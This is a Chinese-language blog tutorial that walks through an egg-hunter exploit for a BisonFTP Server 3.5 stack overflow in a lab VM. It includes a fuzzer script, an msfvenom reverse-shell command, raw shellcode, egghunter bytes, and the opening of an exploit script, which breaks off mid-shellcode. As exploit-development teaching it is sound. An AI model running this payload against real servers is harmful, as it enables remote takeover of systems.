<!DOCTYPE html>
<html>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="0x00.POC触发环境及工具  VMware + WindwosXP EN SP3 Immunity Debugger v1.85 + mona.py Vulnerable App获取:(https://www.exploit-db.com/exploits/17649/)  0x01.“Egg Hunter”原理说明&amp;emsp;BisonWare BisonFTP Server 3.5漏洞分析">
<meta name="keywords" content="CVE-1999-1510,Egg Hunter">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP">
<meta property="og:url" content="http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/index.html">
<meta property="og:site_name" content="The Cyber_Hunter">
<meta property="og:description" content="0x00.POC触发环境及工具  VMware + WindwosXP EN SP3 Immunity Debugger v1.85 + mona.py Vulnerable App获取:(https://www.exploit-db.com/exploits/17649/)  0x01.“Egg Hunter”原理说明&amp;emsp;BisonWare BisonFTP Server 3.5漏洞分析">
<meta property="og:image" content="http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/1.png">
<meta property="og:image" content="http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/2.png">
<meta property="og:image" content="http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/3.png">
<meta property="og:image" content="http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/4.png">
<meta property="og:image" content="http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/5.png">
<meta property="og:image" content="http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/6.png">
<meta property="og:image" content="http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/7.png">
<meta property="og:image" content="http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/8.png">
<meta property="og:image" content="http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/9.png">
<meta property="og:image" content="http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/10.png">
<meta property="og:image" content="http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/11.png">
<meta property="og:image" content="http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/12.png">
<meta property="og:image" content="http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/13.png">
<meta property="og:image" content="http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/14.png">
<meta property="og:image" content="http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/15.png">
<meta property="og:updated_time" content="2018-03-23T06:48:29.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP">
<meta name="twitter:description" content="0x00.POC触发环境及工具  VMware + WindwosXP EN SP3 Immunity Debugger v1.85 + mona.py Vulnerable App获取:(https://www.exploit-db.com/exploits/17649/)  0x01.“Egg Hunter”原理说明&amp;emsp;BisonWare BisonFTP Server 3.5漏洞分析">
<meta name="twitter:image" content="http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/1.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/projects_url">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2017/02/28/CVE-2009-1330-m3u-Exploit/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/&text=CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/&title=CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/&is_video=false&description=CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP&body=Check out this article: http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/&title=CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/&title=CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/&title=CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/&title=CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/&name=CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kasymobv Lee</span>
      </span>
      
    <div class="postdate">
        <time datetime="2017-02-26T03:37:00.000Z" itemprop="datePublished">2017-02-25</time>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/CVE-1999-1510/">CVE-1999-1510</a>, <a class="tag-link" href="/tags/Egg-Hunter/">Egg Hunter</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><strong>0x00.POC触发环境及工具</strong></p>
<ol>
<li>VMware + WindwosXP EN SP3</li>
<li>Immunity Debugger v1.85 + mona.py</li>
<li>Vulnerable App获取:(<a href="https://www.exploit-db.com/exploits/17649/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/17649/</a>)</li>
</ol>
<p><strong>0x01.“Egg Hunter”原理说明</strong><br>&emsp;BisonWare BisonFTP Server 3.5漏洞分析文章现在很多，也是栈溢出的相对简单例子。该程序在接收数据时，对”CMD“命令如”ABOR“的参数传入长度无判断可导致栈溢出并覆盖SEH结构。基于“HackSys Team”的文章(附文末)启发，某些情况下当空间不足以放下特定功能的ShellCode时(下图为例)<br><img src="/2017/02/25/CVE-1999-1510-egghunter/1.png"><br>&emsp;我们可以使用“Egg Hunter”的方式将ShellCode放置于数据包前面并在头上绑一个“tag”，将原来狭小的空间放一段对”tag”的搜寻指令并跳转至ShellCode处，这样就实现了远程代码执行。<br><img src="/2017/02/25/CVE-1999-1510-egghunter/2.png">  </p>
<p><strong>0x02.漏洞Fuzzer</strong><br>&emsp;启动BisonFTPServer，以”ABOR”参数为例，向ftp server 发送长达1400的字符串<br><img src="/2017/02/25/CVE-1999-1510-egghunter/3.png"><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#BisonFTP_Fuzzer.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket,time</span><br><span class="line">buffer = <span class="string">"\x41"</span>*<span class="number">1400</span> <span class="comment">#1400 A’s</span></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>,<span class="number">21</span>))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Start Sending Payload.."</span></span><br><span class="line">s.recv(<span class="number">2000</span>)</span><br><span class="line"></span><br><span class="line">s.send(<span class="string">'USER anonymouse\r\n'</span>)</span><br><span class="line">s.recv(<span class="number">2000</span>)</span><br><span class="line">s.send(<span class="string">'PASS anonymouse\r\n'</span>)</span><br><span class="line">s.recv(<span class="number">2000</span>)</span><br><span class="line">s.send(<span class="string">'ABOR '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Payload Send Successful.."</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;我们可以发现BisonFTPServer直接退出，这是触发了SEH异常处理机制，我们重新开启BisonFTPServer并用Immunity Debugger附加进程再运行，重新执行BisonFTP_Fuzzer.py后再次捕获错误<br><img src="/2017/02/25/CVE-1999-1510-egghunter/4.png"><br>&emsp;EIP指向非法地址41414141，EBX指向铺满\x41(“A”)的内存区。说明发送的畸形数据包已经将JMP EBX位置覆盖。<br><img src="/2017/02/25/CVE-1999-1510-egghunter/5.png">  </p>
<p><strong>0x03.ShellCode的编写</strong>  </p>
<ol>
<li>首先需要获取覆盖”JMP EBX“的点在数据包中的位置，使用mona.py生成长度为1400字节的字符串<br><img src="/2017/02/25/CVE-1999-1510-egghunter/6.png"><br>&emsp;替换掉Python脚本中的buffer值  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="string">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu"</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>&emsp;执行脚本，报错42376E42地址不可读，EBX指向字符串“3Bm4”<br><img src="/2017/02/25/CVE-1999-1510-egghunter/7.png"><br><img src="/2017/02/25/CVE-1999-1510-egghunter/8.png"><br>&emsp;命令!mona findmsp 检查偏移量，EBX指向畸形数据包1151处，长度为249字节，长度不足以存放后面生成的ShellCode(351字节)<br><img src="/2017/02/25/CVE-1999-1510-egghunter/9.png">  </p>
<ol>
<li>剔除所有的“坏字符”：使用mona.py生成\x00~\xFF的所有字符串，再次替换Fuzzer脚本中的buffer值<br><img src="/2017/02/25/CVE-1999-1510-egghunter/10.png">  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">buffer=(<span class="string">"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"</span></span><br><span class="line"><span class="string">"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"</span></span><br><span class="line"><span class="string">"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"</span></span><br><span class="line"><span class="string">"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"</span></span><br><span class="line"><span class="string">"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"</span></span><br><span class="line"><span class="string">"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"</span></span><br><span class="line"><span class="string">"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"</span></span><br><span class="line"><span class="string">"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span>)</span><br><span class="line">buffer+= <span class="string">"\x41"</span>*(1155-len(buffer))</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>&emsp;执行脚本，内存中\x00~\xFF连续，不存在“坏字符”！  </p>
<ol>
<li>既然不存在坏字符，我们就使用msfvenom生成一段开启远程主机4444端口的ShellCode：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　　msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 –e x86/shikata_ga_nai -t python -f c</span><br></pre></td></tr></table></figure>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (<span class="string">"\xbd\xa9\x85\x2d\x7f\xda\xd0\xd9\x74\x24\xf4\x58\x29\xc9\xb1"</span></span><br><span class="line"><span class="string">"\x56\x31\x68\x13\x83\xc0\x04\x03\x68\xa6\x67\xd8\x83\x50\xee"</span></span><br><span class="line"><span class="string">"\x23\x7c\xa0\x91\xaa\x99\x91\x83\xc9\xea\x83\x13\x99\xbf\x2f"</span></span><br><span class="line"><span class="string">"\xdf\xcf\x2b\xa4\xad\xc7\x5c\x0d\x1b\x3e\x52\x8e\xad\xfe\x38"</span></span><br><span class="line"><span class="string">"\x4c\xaf\x82\x42\x80\x0f\xba\x8c\xd5\x4e\xfb\xf1\x15\x02\x54"</span></span><br><span class="line"><span class="string">"\x7d\x87\xb3\xd1\xc3\x1b\xb5\x35\x48\x23\xcd\x30\x8f\xd7\x67"</span></span><br><span class="line"><span class="string">"\x3a\xc0\x47\xf3\x74\xf8\xec\x5b\xa5\xf9\x21\xb8\x99\xb0\x4e"</span></span><br><span class="line"><span class="string">"\x0b\x69\x43\x86\x45\x92\x75\xe6\x0a\xad\xb9\xeb\x53\xe9\x7e"</span></span><br><span class="line"><span class="string">"\x13\x26\x01\x7d\xae\x31\xd2\xff\x74\xb7\xc7\x58\xff\x6f\x2c"</span></span><br><span class="line"><span class="string">"\x58\x2c\xe9\xa7\x56\x99\x7d\xef\x7a\x1c\x51\x9b\x87\x95\x54"</span></span><br><span class="line"><span class="string">"\x4c\x0e\xed\x72\x48\x4a\xb6\x1b\xc9\x36\x19\x23\x09\x9e\xc6"</span></span><br><span class="line"><span class="string">"\x81\x41\x0d\x13\xb3\x0b\x5a\xd0\x8e\xb3\x9a\x7e\x98\xc0\xa8"</span></span><br><span class="line"><span class="string">"\x21\x32\x4f\x81\xaa\x9c\x88\xe6\x81\x59\x06\x19\x29\x9a\x0e"</span></span><br><span class="line"><span class="string">"\xde\x7d\xca\x38\xf7\xfd\x81\xb8\xf8\x28\x05\xe9\x56\x82\xe6"</span></span><br><span class="line"><span class="string">"\x59\x17\x72\x8f\xb3\x98\xad\xaf\xbb\x72\xd8\xf7\x75\xa6\x89"</span></span><br><span class="line"><span class="string">"\x9f\x77\x58\x3c\x3c\xf1\xbe\x54\xac\x57\x68\xc0\x0e\x8c\xa1"</span></span><br><span class="line"><span class="string">"\x77\x70\xe6\x9d\x20\xe6\xbe\xcb\xf6\x09\x3f\xde\x55\xa5\x97"</span></span><br><span class="line"><span class="string">"\x89\x2d\xa5\x23\xab\x32\xe0\x03\xa2\x0b\x63\xd9\xda\xde\x15"</span></span><br><span class="line"><span class="string">"\xde\xf6\x88\xb6\x4d\x9d\x48\xb0\x6d\x0a\x1f\x95\x40\x43\xf5"</span></span><br><span class="line"><span class="string">"\x0b\xfa\xfd\xeb\xd1\x9a\xc6\xaf\x0d\x5f\xc8\x2e\xc3\xdb\xee"</span></span><br><span class="line"><span class="string">"\x20\x1d\xe3\xaa\x14\xf1\xb2\x64\xc2\xb7\x6c\xc7\xbc\x61\xc2"</span></span><br><span class="line"><span class="string">"\x81\x28\xf7\x28\x12\x2e\xf8\x64\xe4\xce\x49\xd1\xb1\xf1\x66"</span></span><br><span class="line"><span class="string">"\xb5\x35\x8a\x9a\x25\xb9\x41\x1f\x55\xf0\xcb\x36\xfe\x5d\x9e"</span></span><br><span class="line"><span class="string">"\x0a\x63\x5e\x75\x48\x9a\xdd\x7f\x31\x59\xfd\x0a\x34\x25\xb9"</span></span><br><span class="line"><span class="string">"\xe7\x44\x36\x2c\x07\xfa\x37\x65"</span>)</span><br></pre></td></tr></table></figure>
<p>&emsp;总大小:351 bytes  </p>
<p><strong>0x04.获取”JMP EBX”地址</strong><br>&emsp;这里我们使用SHELL32.dll中的”JMP EBX”的地址：7CB1E88F<br><img src="/2017/02/25/CVE-1999-1510-egghunter/11.png">  </p>
<p><strong>0x05.使用“Egg Hunter”方式编写Exploit.py</strong><br>&emsp;这里约定’tag’为字符串”ring”，使用mona.py生成搜寻指令<br><img src="/2017/02/25/CVE-1999-1510-egghunter/12.png"><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Egghunter , tag ring : </span><br><span class="line"><span class="string">"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"</span></span><br><span class="line"><span class="string">"\xef\xb8\x72\x69\x6e\x67\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"</span></span><br><span class="line">Put this tag <span class="keyword">in</span> front of your shellcode : ringring</span><br></pre></td></tr></table></figure></p>
<p>&emsp;下面直接构造恶意数据包<br><img src="/2017/02/25/CVE-1999-1510-egghunter/13.png"><br>Exploit脚本(请自行修改)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket,time</span><br><span class="line"></span><br><span class="line">shellcode = (<span class="string">"ringring"</span> + <span class="string">"\xbd\xa9\x85\x2d\x7f\xda\xd0\xd9\x74\x24\xf4\x58\x29\xc9\xb1"</span></span><br><span class="line"><span class="string">"\x56\x31\x68\x13\x83\xc0\x04\x03\x68\xa6\x67\xd8\x83\x50\xee"</span></span><br><span class="line"><span class="string">"\x23\x7c\xa0\x91\xaa\x99\x91\x83\xc9\xea\x83\x13\x99\xbf\x2f"</span></span><br><span class="line"><span class="string">"\xdf\xcf\x2b\xa4\xad\xc7\x5c\x0d\x1b\x3e\x52\x8e\xad\xfe\x38"</span></span><br><span class="line"><span class="string">"\x4c\xaf\x82\x42\x80\x0f\xba\x8c\xd5\x4e\xfb\xf1\x15\x02\x54"</span></span><br><span class="line"><span class="string">"\x7d\x87\xb3\xd1\xc3\x1b\xb5\x35\x48\x23\xcd\x30\x8f\xd7\x67"</span></span><br><span class="line"><span class="string">"\x3a\xc0\x47\xf3\x74\xf8\xec\x5b\xa5\xf9\x21\xb8\x99\xb0\x4e"</span></span><br><span class="line"><span class="string">"\x0b\x69\x43\x86\x45\x92\x75\xe6\x0a\xad\xb9\xeb\x53\xe9\x7e"</span></span><br><span class="line"><span class="string">"\x13\x26\x01\x7d\xae\x31\xd2\xff\x74\xb7\xc7\x58\xff\x6f\x2c"</span></span><br><span class="line"><span class="string">"\x58\x2c\xe9\xa7\x56\x99\x7d\xef\x7a\x1c\x51\x9b\x87\x95\x54"</span></span><br><span class="line"><span class="string">"\x4c\x0e\xed\x72\x48\x4a\xb6\x1b\xc9\x36\x19\x23\x09\x9e\xc6"</span></span><br><span class="line"><span class="string">"\x81\x41\x0d\x13\xb3\x0b\x5a\xd0\x8e\xb3\x9a\x7e\x98\xc0\xa8"</span></span><br><span class="line"><span class="string">"\x21\x32\x4f\x81\xaa\x9c\x88\xe6\x81\x59\x06\x19\x29\x9a\x0e"</span></span><br><span class="line"><span class="string">"\xde\x7d\xca\x38\xf7\xfd\x81\xb8\xf8\x28\x05\xe9\x56\x82\xe6"</span></span><br><span class="line"><span class="string">"\x59\x17\x72\x8f\xb3\x98\xad\xaf\xbb\x72\xd8\xf7\x75\xa6\x89"</span></span><br><span class="line"><span class="string">"\x9f\x77\x58\x3c\x3c\xf1\xbe\x54\xac\x57\x68\xc0\x0e\x8c\xa1"</span></span><br><span class="line"><span class="string">"\x77\x70\xe6\x9d\x20\xe6\xbe\xcb\xf6\x09\x3f\xde\x55\xa5\x97"</span></span><br><span class="line"><span class="string">"\x89\x2d\xa5\x23\xab\x32\xe0\x03\xa2\x0b\x63\xd9\xda\xde\x15"</span></span><br><span class="line"><span class="string">"\xde\xf6\x88\xb6\x4d\x9d\x48\xb0\x6d\x0a\x1f\x95\x40\x43\xf5"</span></span><br><span class="line"><span class="string">"\x0b\xfa\xfd\xeb\xd1\x9a\xc6\xaf\x0d\x5f\xc8\x2e\xc3\xdb\xee"</span></span><br><span class="line"><span class="string">"\x20\x1d\xe3\xaa\x14\xf1\xb2\x64\xc2\xb7\x6c\xc7\xbc\x61\xc2"</span></span><br><span class="line"><span class="string">"\x81\x28\xf7\x28\x12\x2e\xf8\x64\xe4\xce\x49\xd1\xb1\xf1\x66"</span></span><br><span class="line"><span class="string">"\xb5\x35\x8a\x9a\x25\xb9\x41\x1f\x55\xf0\xcb\x36\xfe\x5d\x9e"</span></span><br><span class="line"><span 